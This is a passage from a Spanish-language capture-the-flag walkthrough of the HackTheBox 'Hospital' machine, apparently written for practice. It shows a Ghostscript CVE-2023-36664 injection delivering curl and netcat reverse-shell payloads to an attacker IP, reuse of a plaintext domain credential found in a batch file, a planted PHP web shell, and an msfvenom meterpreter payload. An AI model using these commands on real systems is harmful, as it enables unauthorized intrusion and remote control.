<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"curl 10.10.14.71:80/nc.exe -o nc.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div>

<ul>
  <li>Ahora vamos a enviar el <code class="language-plaintext highlighter-rouge">.eps</code> al <code class="language-plaintext highlighter-rouge">Dr.Brown</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/14.png" />
</p>

<ul>
  <li>Una vez enviamos el mensaje nos llega la solicitud que descargo el <code class="language-plaintext highlighter-rouge">nc.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.241 - - <span class="o">[</span>11/May/2024 18:36:30] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Ahora nos vamos a enviar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 CVE_2023_36664_exploit.py <span class="nt">--inject</span> <span class="nt">--payload</span> <span class="s2">"nc.exe 10.10.14.71 443 -e cmd.exe"</span> <span class="nt">--filename</span> file.eps
<span class="o">[</span>+] Payload successfully injected into file.eps.
</code></pre></div></div>

<ul>
  <li>
    <p>Y de igual manera enviamos por correo al mismo destinatario el <code class="language-plaintext highlighter-rouge">file.eps</code>.</p>
  </li>
  <li>
    <p>Nos llega la shell.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.241] 6171
Microsoft Windows <span class="o">[</span>Version 10.0.17763.4974]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="usertxt">User.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
9094302029572892e53320578b26c0b0
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>En el directorio de <code class="language-plaintext highlighter-rouge">Documents</code> podemos ver que allí se encuentra el <code class="language-plaintext highlighter-rouge">.bat</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 7357-966F

 Directory of C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments

05/12/2024  12:36 AM    &lt;DIR&gt;          <span class="nb">.</span>
05/12/2024  12:36 AM    &lt;DIR&gt;          ..
10/23/2023  03:33 PM               373 ghostscript.bat
05/12/2024  12:36 AM            28,160 nc.exe
               2 File<span class="o">(</span>s<span class="o">)</span>         28,533 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>   4,184,203,264 bytes free

C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;type ghostscript.bat
<span class="nb">type </span>ghostscript.bat
@echo off
<span class="nb">set </span><span class="nv">filename</span><span class="o">=</span>%~1
powershell <span class="nt">-command</span> <span class="s2">"</span><span class="nv">$p</span><span class="s2"> = convertto-securestring 'chr!</span><span class="nv">$br0wn</span><span class="s2">' -asplain -force;</span><span class="nv">$c</span><span class="s2"> = new-object system.management.automation.pscredential('hospital</span><span class="se">\d</span><span class="s2">rbrown', </span><span class="nv">$p</span><span class="s2">);Invoke-Command -ComputerName dc -Credential </span><span class="nv">$c</span><span class="s2"> -ScriptBlock { cmd.exe /c "</span>C:<span class="se">\P</span>rogram<span class="sb">`</span> Files<span class="se">\g</span>s<span class="se">\g</span>s10.01.1<span class="se">\b</span><span class="k">in</span><span class="se">\g</span>swin64c.exe<span class="s2">" -dNOSAFER "</span>C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ownloads<span class="se">\%</span>filename%<span class="s2">" }"</span>
C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Tenemos la credencial del <code class="language-plaintext highlighter-rouge">Dr.Brown:chr!$br0wn</code> vamos a validarlas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  CVE-2023-36664-Ghostscript-command-injection git:<span class="o">(</span>main<span class="o">)</span> ✗ cme smb 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span>
</code></pre></div></div>

<ul>
  <li>Podemos usar evil-winrm para mas comodo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>
SMB         10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span>
HTTP        10.10.11.241    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.241:5985/wsman
WINRM       10.10.11.241    5985   DC               <span class="o">[</span>+] hospital.htb<span class="se">\d</span>rbrown:chr!<span class="nv">$br0wn</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>

➜  content evil-winrm <span class="nt">-i</span> 10.10.11.241 <span class="nt">-u</span> <span class="s1">'drbrown'</span> <span class="nt">-p</span> <span class="s1">'chr!$br0wn'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>hospital<span class="se">\d</span>rbrown
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Si probamos el <code class="language-plaintext highlighter-rouge">winpeas</code> <a href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a> al ejecutar esto encontramos lo siguiente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications <span class="nt">--Via</span> Program Files/Uninstall registry--
È Check <span class="k">if </span>you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:<span class="se">\P</span>rogram Files<span class="se">\C</span>ommon Files
    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>esktop.ini
    C:<span class="se">\P</span>rogram Files<span class="se">\d</span>otnet
    C:<span class="se">\P</span>rogram Files<span class="se">\G</span>oogle
    C:<span class="se">\P</span>rogram Files<span class="se">\g</span>s
    C:<span class="se">\P</span>rogram Files<span class="se">\H</span>yper-V
    C:<span class="se">\P</span>rogram Files<span class="se">\i</span>nternet explorer
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft UCMA 4.0
    C:<span class="se">\P</span>rogram Files<span class="se">\M</span>SBuild
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ackageManagement
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>uTTY
    C:<span class="se">\P</span>rogram Files<span class="se">\P</span>ython312
    C:<span class="se">\P</span>rogram Files<span class="se">\R</span>eference Assemblies
    C:<span class="se">\P</span>rogram Files<span class="se">\U</span>ninstall Information
    C:<span class="se">\P</span>rogram Files<span class="se">\V</span>Mware
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Defender Advanced Threat Protection
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Identity Foundation
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Mail
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Media Player
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Multimedia Platform
    C:<span class="se">\P</span>rogram Files<span class="se">\w</span>indows nt
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Photo Viewer
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Portable Devices
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Security
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indows Sidebar
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsApps
    C:<span class="se">\P</span>rogram Files<span class="se">\W</span>indowsPowerShell
    C:<span class="se">\x</span>ampp<span class="o">(</span>Users <span class="o">[</span>AppendData/CreateDirectories WriteData/CreateFiles]<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>El <code class="language-plaintext highlighter-rouge">AppendData</code> significa que podemos añadir datos o archivos o crear directorios dentro de la carpeta especificada y <code class="language-plaintext highlighter-rouge">WriteData/CreateFiles</code> nos permite escribir datos en archivos existentes o crear nuevos archivos dentro del directorio como es común en aplicaciones web o servidores que se gestionan a través de <code class="language-plaintext highlighter-rouge">XAMPP</code>. En este caso, <code class="language-plaintext highlighter-rouge">XAMPP</code>, que es un paquete que incluye <code class="language-plaintext highlighter-rouge">Apache</code>, <code class="language-plaintext highlighter-rouge">MySQL</code>, y otros componentes para servidores web, necesitaría estos permisos para operar correctamente y permitir al usuario administrar sitios web, bases de datos, y otros servicios relacionados.</p>
  </li>
  <li>
    <p>Si entramos en <code class="language-plaintext highlighter-rouge">htdocs</code> encontramos archivos de configuración.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; <span class="nb">cd </span>htdocs
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       10/22/2023  10:19 PM                bin
d-----       10/22/2023  11:47 PM                config
d-----       10/22/2023  10:33 PM                default
d-----       10/22/2023  10:19 PM                installer
d-----       10/22/2023  10:32 PM                logs
d-----       10/22/2023  10:19 PM                plugins
d-----       10/22/2023  10:20 PM                program
d-----       10/22/2023  10:20 PM                skins
d-----       10/22/2023  10:19 PM                SQL
d-----        5/12/2024  12:41 AM                temp
d-----       10/22/2023  10:20 PM                vendor
<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
</code></pre></div></div>

<ul>
  <li>Si vemos los permisos establecidos para la carpeta los permisos indican que las cuentas de servicio del sistema y los administradores tienen acceso completo, mientras que los usuarios normales tienen permisos más limitados de lectura y ejecución, con capacidades específicas para añadir o borrar datos. Esto es típico en entornos donde se necesita limitar el acceso de los usuarios comunes para prevenir cambios no autorizados en aplicaciones críticas como las que se manejan a través de XAMPP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp&gt; icacls htdocs
htdocs NT AUTHORITY<span class="se">\L</span>OCAL SERVICE:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>AD<span class="o">)</span>
       BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD<span class="o">)</span>
       CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>

Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
</code></pre></div></div>

<ul>
  <li>Podemos añadir y escribir en la carpeta si queremos ganar acceso rápido lo que podemos hacer es subir el <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a> .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  p0wny-shell git:<span class="o">(</span>master<span class="o">)</span> python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.241 - - <span class="o">[</span>11/May/2024 19:12:01] <span class="s2">"GET /shell.php HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; curl <span class="nt">-o</span> shell.php http://10.10.14.71:80/shell.php
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----       10/22/2023  10:19 PM                bin
d-----       10/22/2023  11:47 PM                config
d-----       10/22/2023  10:33 PM                default
d-----       10/22/2023  10:19 PM                installer
d-----       10/22/2023  10:32 PM                logs
d-----       10/22/2023  10:19 PM                plugins
d-----       10/22/2023  10:20 PM                program
d-----       10/22/2023  10:20 PM                skins
d-----       10/22/2023  10:19 PM                SQL
d-----        5/12/2024  12:41 AM                temp
d-----       10/22/2023  10:20 PM                vendor
<span class="nt">-a----</span>       10/16/2023  12:23 PM           2553 .htaccess
<span class="nt">-a----</span>       10/16/2023  12:23 PM         211743 CHANGELOG.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            994 composer.json
<span class="nt">-a----</span>       10/16/2023  12:23 PM           1086 composer.json-dist
<span class="nt">-a----</span>       10/16/2023  12:23 PM          56279 composer.lock
<span class="nt">-a----</span>       10/16/2023  12:23 PM          11199 index.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM          12661 INSTALL
<span class="nt">-a----</span>       10/16/2023  12:23 PM          35147 LICENSE
<span class="nt">-a----</span>       10/16/2023  12:23 PM           3853 README.md
<span class="nt">-a----</span>       10/16/2023  12:23 PM            967 SECURITY.md
<span class="nt">-a----</span>        5/12/2024   1:12 AM          20321 shell.php
<span class="nt">-a----</span>       10/16/2023  12:23 PM           4657 UPGRADING


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hospital/15.png" />
</p>

<h2 id="la-otra-forma-de-escalar-privilegios">La otra forma de escalar privilegios</h2>

<ul>
  <li>En esta maquina existe otra forma de escalar privilegios si vemos las sesiones activas en el sistema vemos que hay una sesión activa por el doctor cada usuario corre tareas o servicios del sistema para enumerarlos vamos a usar <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
<span class="o">&gt;</span>services                                    0  Disc
 console           drbrown                   1  Active
 rdp-tcp                                 65536  Listen
</code></pre></div></div>

<ul>
  <li>Lo primero que vamos a hacer ejecutarnos un <code class="language-plaintext highlighter-rouge">.exe</code> para ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.71 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
</code></pre></div></div>

<ul>
  <li>Ahora lo subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; upload shell.exe

Info: Uploading /home/miguel/Hackthebox/Hospital/content/shell.exe to C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop<span class="se">\s</span>hell.exe

Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt;
</code></pre></div></div>

<ul>
  <li>Iniciamos <code class="language-plaintext highlighter-rouge">Metasploit</code> y preparamos todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfconsole
Metasploit tip: Use <span class="nb">help</span> &lt;<span class="nb">command</span><span class="o">&gt;</span> to learn more about any <span class="nb">command</span>

  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  <span class="o">==</span>c<span class="o">(</span>______<span class="o">(</span>o<span class="o">(</span>______<span class="o">(</span>_<span class="o">()</span>  | |<span class="s2">""""""""""""</span>|<span class="o">======[</span><span class="k">***</span>  |
  |             <span class="o">)=</span><span class="se">\ </span>          | |  EXPLOIT   <span class="se">\ </span>           |
  |            // <span class="se">\\</span>          | |_____________<span class="se">\_</span>______    |
  |           //   <span class="se">\\</span>         | |<span class="o">==[</span>msf <span class="o">&gt;]============</span><span class="se">\ </span>  |
  |          //     <span class="se">\\</span>        | |______________________<span class="se">\ </span> |
  |         // RECON <span class="se">\\</span>       | <span class="se">\(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)(</span>@<span class="o">)</span>/   |
  |        //         <span class="se">\\</span>      |  <span class="k">*********************</span>    |
  +---------------------------+---------------------------+
  |      o O o                |        <span class="se">\'\/\/\/</span><span class="s1">'/         |
  |              o O          |         )======(          |
  |                 o         |       .'</span>  LOOT  <span class="s1">'.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '</span><span class="nt">--------------</span><span class="s1">'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.4.2-dev                           ]
+ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 10.10.14.71
lhost =&gt; 10.10.14.71
msf6 exploit(multi/handler) &gt; set lport 443
lport =&gt; 443
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.71:443
</span></code></pre></div></div>

<ul>
  <li>Ahora ejecutamos el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\d</span>rbrown.HOSPITAL<span class="se">\D</span>esktop&gt; .<span class="se">\s</span>hell.exe
</code></pre></div></div>

<ul>
  <li>Ahora ya obtenemos una conexión, vamos a ver los procesos que se están corriendo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps

Process List
<span class="o">============</span>

 PID   PPID  Name       Arch  Session  User            Path
 <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>       <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>            <span class="nt">----</span>
 0     0     <span class="o">[</span>System P
             rocess]
 4     0     System
 48    4     Secure Sy
             stem
 92    4     Registry
 336   4     smss.exe
 364   656   svchost.e
             xe
 368   656   svchost.e
             xe
 380   656   svchost.e
             xe
 416   408   csrss.exe
 516   616   dwm.exe
 520   408   wininit.e
             xe
 528   512   csrss.exe
 616   512   winlogon.
             exe
 656   520   services.
             exe
 676   520   LsaIso.ex
             e
 684   520   lsass.exe
 784   656   svchost.e
             xe
 852   656   VGAuthSer
             vice.exe
 892   656   svchost.e
             xe
 900   656   svchost.e
             xe
 912   656   svchost.e
             xe
 952   656   svchost.e
             xe
 996   656   svchost.e
             xe
 1016  656   svchost.e
             xe
 1052  656   svchost.e
             xe
 1072  656   svchost.e
             xe
 1116  656   svchost.e
             xe
 1164  656   svchost.e
             xe
 1244  656   svchost.e
             xe
 1276  656   svchost.e
             xe
 1304  656   svchost.e
             xe
 1324  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\s</span>vchost.ex
                                                       e
 1336  656   svchost.e
             xe
 1408  656   svchost.e
             xe
 1416  656   svchost.e
             xe
 1452  656   svchost.e
             xe
 1520  656   svchost.e
             xe
 1540  656   svchost.e
             xe
 1548  656   svchost.e
             xe
 1616  656   svchost.e
             xe
 1624  656   svchost.e
             xe
 1752  656   svchost.e
             xe
 1760  656   svchost.e
             xe
 1780  656   svchost.e
             xe
 1792  656   svchost.e
             xe
 1856  656   svchost.e
             xe
 1900  656   svchost.e
             xe
 1924  656   svchost.e
             xe
 2060  656   svchost.e
             xe
 2096  656   svchost.e
             xe
 2116  656   svchost.e
             xe
 2124  656   svchost.e
             xe
 2424  656   SMSvcHost
             .exe
 2464  656   svchost.e
             xe
 2564  656   svchost.e
             xe
 2700  616   fontdrvho
             st.exe
 2708  520   fontdrvho
             st.exe
 2748  656   svchost.e
             xe
 2768  656   svchost.e
             xe
 2776  656   httpd.exe
 2784  656   Microsoft
             .ActiveDi
             rectory.W
             ebService
             s.exe
 2796  656   svchost.e
             xe
 2808  656   svchost.e
             xe
 2852  656   dfsrs.exe
 2904  656   svchost.e
             xe
 2924  656   dns.exe
 2948  656   hMailServ
             er.exe
 2960  656   svchost.e
             xe
 2984  656   mysqld.ex
             e
 3008  656   svchost.e
             xe
 3020  656   ismserv.e
             xe
 3028  656   mqsvc.exe
 3060  656   svchost.e
             xe
 3068  7396  python.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             e                         wn              s<span class="se">\P</span>ython312<span class="se">\p</span>yt
                                                       hon.exe
 3108  656   svchost.e
             xe
 3120  656   dfssvc.ex
             e
 3140  2124  sihost.ex  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             e                         wn              em32<span class="se">\s</span>ihost.exe
 3144  656   vmtoolsd.
             exe
 3192  656   svchost.e
             xe
 3236  656   vmms.exe
 3244  656   vm3dservi
             ce.exe
 3292  656   svchost.e
             xe
 3308  656   svchost.e
             xe
 3316  656   svchost.e
             xe
 3532  656   svchost.e
             xe
 3572  3244  vm3dservi
             ce.exe
 3888  656   vds.exe
 4116  912   wsmprovho  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             st.exe                    wn              em32<span class="se">\w</span>smprovhos
                                                       t.exe
 4156  2776  httpd.exe
 5208  656   dllhost.e
             xe
